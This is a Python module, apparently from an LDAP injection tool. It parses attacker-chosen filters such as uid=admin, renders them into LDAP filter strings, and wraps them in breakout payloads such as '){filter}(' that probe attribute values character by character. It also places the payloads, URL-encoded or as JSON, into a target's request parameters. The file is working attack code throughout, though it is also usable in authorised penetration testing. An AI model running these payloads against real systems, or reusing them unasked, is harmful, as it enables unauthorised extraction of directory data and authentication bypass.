from dataclasses import dataclass
from typing import Sequence
from urllib.parse import quote


@dataclass(frozen=True)
class LdapFilterEquality:
    """Simple LDAP equality filter node: ``(attribute=value)``."""

    attribute: str
    value: str


@dataclass(frozen=True)
class LdapFilterAnd:
    """LDAP conjunction node: ``(&<child1><child2>...)``."""

    children: tuple["LdapFilterNode", ...]


LdapFilterNode = LdapFilterEquality | LdapFilterAnd


def render_ldap_filter(node: LdapFilterNode) -> str:
    """Render a filter AST node to LDAP filter string form."""
    if isinstance(node, LdapFilterEquality):
        return f"({node.attribute}={node.value})"
    return f"(&{''.join(render_ldap_filter(child) for child in node.children)})"


def parse_extraction_filter(filter_expression: str) -> LdapFilterEquality:
    """
    Parse a user-supplied extraction filter into an AST node.

    Supported forms:
      - ``attribute=value``
      - ``(attribute=value)``
    """
    token = filter_expression.strip()
    if token.startswith("(") and token.endswith(")"):
        token = token[1:-1].strip()
    if "=" not in token:
        raise ValueError("extraction filter must contain '=' (e.g. uid=admin)")
    attribute, value = token.split("=", 1)
    attribute = attribute.strip()
    value = value.strip()
    if not attribute:
        raise ValueError("extraction filter attribute cannot be empty")
    if any(ch in attribute for ch in "()&|!"):
        raise ValueError("extraction filter attribute contains invalid LDAP filter chars")
    return LdapFilterEquality(attribute=attribute, value=value)


def build_attribute_probe_payloads(
    attribute: str,
    value: str,
    exact: bool = False,
    extraction_filters: Sequence[LdapFilterNode] | None = None,
) -> tuple[str, ...]:
    """
    Build injection payload strings for attribute probing from an LDAP filter AST.

    The filter AST is rendered first, then post-processed into known injection
    wrappers used by the engine.
    """
    probe_value = value if exact else f"{value}*"
    probe_node: LdapFilterNode = LdapFilterEquality(attribute=attribute, value=probe_value)
    if extraction_filters:
        probe_node = LdapFilterAnd(children=tuple([*extraction_filters, probe_node]))
    rendered = render_ldap_filter(probe_node)
    return (
        f"){rendered}(",
        f"){rendered}({attribute}=",
        f"){rendered}",
    )


def build_payload_data(
    base_data: dict,
    param: str,
    injection: str,
    use_json: bool = False,
) -> dict:
    """
    Return a copy of *base_data* with *param* replaced by *injection*.

    For form data (``use_json=False``) the injection string is URL-encoded
    before substitution so that special LDAP characters travel correctly over
    HTTP.  For JSON data (``use_json=True``) the raw string is used because
    the requests library serialises the dict to JSON automatically.
    """
    payload_data = dict(base_data)
    if use_json:
        payload_data[param] = injection
    else:
        # quote() encodes characters that would break the form field; the server
        # decodes them back before passing the value to the LDAP query.
        payload_data[param] = quote(injection, safe="")
    return payload_data
